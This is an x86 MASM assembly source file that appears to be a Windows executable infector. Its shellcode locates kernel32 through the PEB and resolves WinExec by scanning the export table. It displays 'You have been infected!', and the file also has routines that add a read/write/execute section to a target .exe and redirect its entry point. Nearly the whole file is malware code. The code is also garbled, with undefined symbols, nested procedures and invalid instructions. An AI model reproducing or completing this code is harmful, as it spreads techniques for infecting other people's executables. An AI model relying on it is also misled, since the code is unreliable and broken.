.386
.model flat, stdcall
.stack 4096
assume fs:nothing

include	windows.inc
include	user32.inc
include	kernel32.inc
include	comdlg32.inc
includelib user32.lib
includelib kernel32.lib
includelib comdlg32.lib

DlgProc			PROTO		:DWORD,:DWORD,:DWORD,:DWORD
Validate		PROTO		:DWORD
AddSection		PROTO		:DWORD

.data
file_name db "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe", 0
strFilter		db			"Executable Files (*.exe, *.dll)",0,
							"*.exe;*.dll",0,"All Files",0,"*.*",0,0 
OpenError		db			"Unable to open target file",0
Invalid			db			"This is not a valid PE file!!",0
Success			db			"New section added successfully",0
NoSpace			db			"No space for new Section Header",0
Backup			db			".bak",0
NewSecName		dd			"WEN."
NewSecSize		dd			100h
NewSecChar		dd			0E0000060h
KeepBkup		db			TRUE

.data?
ofn				OPENFILENAME	<>
hInstance		HINSTANCE	?
TargetName		db			512 dup(?)
hTarget			dd			?
hMapping		dd			?
pMapping		dd			?
pPEHeader		dd			?
Buffer			db			512 dup (?)

.const
IDD_MAIN		equ			1001
IDC_TARGET		equ			1003
IDC_BROWSE		equ			1004
IDC_GO 			equ			1005
IDC_EXIT 		equ			1006
ARIcon			equ			2001
	
.code 	
main proc

shellcode proc		
	push ebp		
	mov ebp, esp
	sub esp, 1ch		
	xor eax, eax		
	mov [ebp - 04h], eax
	mov [ebp - 08h], eax			
	mov [ebp - 0ch], eax
	mov [ebp - 10h], eax
	mov [ebp - 14h], eax			
	mov [ebp - 18h], eax		
	mov [ebp - 1ch], eax
	push 00636578h
	push 456e6957h
	mov [ebp - 14h], esp
	mov eax, [fs:30h]
	mov eax, [eax + 0ch]
	mov eax, [eax + 14h]
	mov eax, [eax]
	mov eax, [eax] 
	mov eax, [eax -8h + 18h]
	mov ebx, eax
	mov eax, [ebx + 3ch]
	add eax, ebx		
	mov eax, [eax + 78h]			
	add eax, ebx	
	mov ecx, [eax + 14h]				
	mov [ebp - 4h], ecx	
	mov ecx, [eax + 1ch]			
	add ecx, ebx	
	mov [ebp - 8h], ecx			
	mov ecx, [eax + 20h]			
	add ecx, ebx					    
	mov [ebp - 0ch], ecx	
	mov ecx, [eax + 24h]					
	add ecx, ebx					    		
	mov [ebp - 10h], ecx				
	xor eax, eax		
	xor ecx, ecx
	findWinExecPosition:			
		mov esi, [ebp - 14h]			
		mov edi, [ebp - 0ch]				
		cld													
		mov edi, [edi + eax*4]				
		add edi, ebx				    			
		mov cx, 8					      		
		repe cmpsb					    						
		jz WinExecFound			
		inc eax						
		cmp eax, [ebp - 4h]						
		jne findWinExecPosition		
		WinExecFound:					
			mov ecx, [ebp - 10h]				
			mov edx, [ebp - 8h]								
			mov ax, [ecx + eax * 2]				
			mov eax, [edx + eax * 4]		
			add eax, ebx				    		
			jmp InvokeMsgBox	
		InvokeMsgBox:		  
			push edi
			push '!det'
			push 'cefn'
			push 'i ne'
			push 'eb e'
			push 'vah '
			push 'uoY'
			mov ecx, esp
			push edi
			push edi
			push ecx
			push edi
			call eax
			jmp PushAddress
		PushAddress:
			push 0
			push 0
			push ebx
			push 0
			call eax
			add esp, 8
			mov eax, 0xaaaaaaaa
			jmp GetSize
		GetSize:
			mov esi, ebp 
			invoke GetFileSize, ebp, 0
			mov edx, ebp
			jmp eax
	add esp, 1ch											
	add esp, 0ch									
	add esp, 4h	
	pop ebp		
shellcode endp	

file_opener proc 
	invoke CreateFile,file_name,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0 
	.if eax!=INVALID_HANDLE_VALUE
		mov hTarget,eax
		invoke CreateFileMapping,eax,0,PAGE_READ,0,0,0 
		mov hMapping,eax
		invoke MapViewOfFile,eax,FILE_MAP_READ,0,0,0 
		mov pMapping,eax 
		.if [eax.IMAGE_DOS_HEADER.e_magic]==IMAGE_DOS_SIGNATURE
			add eax,[eax.IMAGE_DOS_HEADER.e_lfanew]
			.if [eax.IMAGE_NT_HEADERS.Signature]==IMAGE_NT_SIGNATURE
				invoke MessageBox,0,addr Valid,addr MsgBoxCap,MB_ICONASTERISK
				mov ebx, eax.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
				SearchOEP:
					mov ecx, 0
					cmp ebx + ecx, edx
					jb ChangeOEP
					ChangeOEP:
						cmp esi + edx, 0xaaaaaaaa
						je Command
						Command:
							add esi, edx
							mov esi, ebx
							jmp SearchOEP
			.endif 
		.else 
			invoke MessageBox,0,addr Invalid,addr MsgBoxCap,MB_ICONASTERISK
		.endif 
		invoke UnmapViewOfFile,pMapping
		invoke CloseHandle,hMapping
		invoke CloseHandle,hTarget
	.else
		invoke MessageBox,0,addr OpenError,0,0
	.endif
	xor eax,eax
	Ret
file_opener endp

add_section proc 
LOCAL ReturnValue:DWORD
		invoke lstrcpy,addr Buffer,file_name
		invoke lstrcat,addr Buffer,addr Backup		
		invoke CopyFile,file_name,addr Buffer,TRUE
	invoke CreateFile,file_name,GENERIC_READ+GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0 
	.if eax!=INVALID_HANDLE_VALUE
		mov hTarget,eax
		invoke GetFileSize,eax,0
		add eax,NewSecSize
		invoke CreateFileMapping,hTarget,0,PAGE_READWRITE,0,eax,0 
		mov hMapping,eax
		invoke MapViewOfFile,eax,FILE_MAP_ALL_ACCESS,0,0,0 
		mov pMapping,eax 
		add eax,[eax.IMAGE_DOS_HEADER.e_lfanew]	
		mov pPEHeader,eax
		movzx esi,[eax.IMAGE_NT_HEADERS.FileHeader.NumberOfSections];no of sections in ecx
		inc esi									
		imul esi,esi,40							
		add esi,0F8h							
		mov ebx,pMapping
		add esi,[ebx.IMAGE_DOS_HEADER.e_lfanew]	
		.if esi<[eax.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]	
			add esi,ebx							
			sub esi,40							
			mov edi,esi							
			sub esi,40							
			mov eax,NewSecName
			mov dword ptr [edi.IMAGE_SECTION_HEADER.Name1],eax	
			mov eax,NewSecSize
			mov [edi.IMAGE_SECTION_HEADER.Misc.VirtualSize],eax	
			xor edx,edx											
			mov ebx,pPEHeader									
			mov ecx,[ebx.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
			div ecx				
			.if edx!=0								
				inc eax			
			.endif				
			mul ecx
			mov [edi.IMAGE_SECTION_HEADER.SizeOfRawData],eax	
			mov eax,[esi.IMAGE_SECTION_HEADER.VirtualAddress]	
			add eax,[esi.IMAGE_SECTION_HEADER.Misc.VirtualSize]	
			xor edx,edx											
			mov ecx,[ebx.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
			div ecx
			.if edx!=0
				inc eax
			.endif
			mul ecx
			mov [edi.IMAGE_SECTION_HEADER.VirtualAddress],eax	
			mov eax,[esi.IMAGE_SECTION_HEADER.PointerToRawData]	
			add eax,[esi.IMAGE_SECTION_HEADER.SizeOfRawData]	
			xor edx,edx											
			mov ecx,[ebx.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
			div ecx
			.if edx!=0
				inc eax
			.endif
			mul ecx
			mov [edi.IMAGE_SECTION_HEADER.PointerToRawData],eax	
			mov edx,NewSecChar
			mov [edi.IMAGE_SECTION_HEADER.Characteristics],edx	
			mov eax,[edi.IMAGE_SECTION_HEADER.Misc.VirtualSize]	
			xor edx,edx											
			mov ecx,[ebx.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment]
			div ecx
			.if edx!=0
				inc eax
			.endif
			mul ecx
			add eax,[edi.IMAGE_SECTION_HEADER.VirtualAddress]	
			mov [ebx.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage],eax	
			inc [ebx.IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
			mov ReturnValue,1
			jmp @EXIT
		.else
			invoke UnmapViewOfFile,pMapping
			invoke CloseHandle,hMapping
			invoke CloseHandle,hTarget
			invoke DeleteFile,FileName
			invoke CopyFile,addr Buffer,FileName,FALSE
			invoke DeleteFile,addr Buffer
			mov ReturnValue,-1
			jmp @EXIT
		.endif
@EXIT:
		invoke UnmapViewOfFile,pMapping
		invoke CloseHandle,hMapping
		invoke CloseHandle,hTarget
		.if KeepBkup==FALSE
			invoke DeleteFile,addr Buffer
		.endif
		mov eax,ReturnValue
		ret
	.else
		invoke MessageBox,0,addr OpenError,0,0
		xor eax,eax
		Ret
	.endif
	Ret
add_section endp

payload_copy proc
	;invoke RtlCopyMemory, addr dest, addr src, sizeof dest
payload_copy endp

main endp
end main